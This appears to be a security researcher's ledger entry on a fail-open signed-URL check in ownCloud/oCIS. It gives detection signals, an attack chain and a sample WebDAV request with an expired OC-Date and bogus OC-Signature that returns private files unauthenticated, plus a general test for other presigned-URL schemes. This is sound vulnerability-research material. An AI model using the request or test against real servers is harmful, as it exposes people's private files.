DETECTION SIGNAL: any signed-URL / presigned-download / token-in-querystring mechanism (`OC-Signature`, `X-Amz-Signature`, `sig=`, `signature=`, `token=`, `expires=`/`OC-Expires`, `date=`/`OC-Date`); a validator whose FIRST decision is the CLOCK and whose only success branch is "not expired" (a fail-open on the expired branch); a signature parameter the server accepts WITHOUT recomputing the HMAC — send `OC-Signature=notchecked` and read the body; the presence of a Credential+Verb+Expires+Date+Signature query set at all (the scheme's maturity); a file the UI reports as private/unshared while the DAV/object path still serves it.
CHAIN: unauthenticated attacker, no account and no session (primitive: network reach only) -> knows only a USERNAME and a FILENAME (primitive: identifiers leaked by shares/comments/links) -> issues `GET /remote.php/dav/files/{user}/{file}` with a deliberately EXPIRED `OC-Date` and a junk `OC-Signature` (primitive: the expiry branch returns a nil error, so signature verification is SKIPPED = fail-open token check) -> the private file is returned (unauthenticated arbitrary file read of the user's/organization's private files — High/BAC; the report's own impact line: "it was possible to access the organization's and users' private files without authentication").
TRANSFERABLE TEST: for every signed-URL / token-download mechanism, send the request twice — once with an EXPIRED expiry and a GARBAGE signature (`OC-Signature=notchecked`, `X-Amz-Signature=AAAA…`, `sig=x`, `token=x`), and once with a valid-looking one — and read the object back. If the expired+garbage request returns the object, the validator fail-opens on the expiry branch. Then walk the boundary: expiry in the PAST, in the FUTURE, `0`, and negative, to find exactly which branch skips the check, and confirm the object is genuinely PRIVATE (the UI says unshared) so the read is unauthorized. Rule: **a validator whose first decision is the clock and whose only success path is "not expired" grants access when the clock check itself returns "no error" — always test the expired branch with a bogus signature.**
DEDUPE: 0 hits across all three write targets for `2337427`, `OC-Credential`, `OC-Signature`, `OC-Expires`, `ocis`, `owncloud`, `urlIsExpired`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: the file's ONE `presigned` hit (ledger ~5586-5594, the `aws-iam-authenticator` entry) is TOKEN-PARAMETER CASE-CONFUSION in a whitelist (`Action`/`action` collapse onto one lowercased key) that lets the attacker control the signed claim — a DIFFERENT primitive from "expiry returns nil error so the signature is never checked"; the `signing key` (2) / `expiry` (3) hits are unrelated (AWS/TLS material).
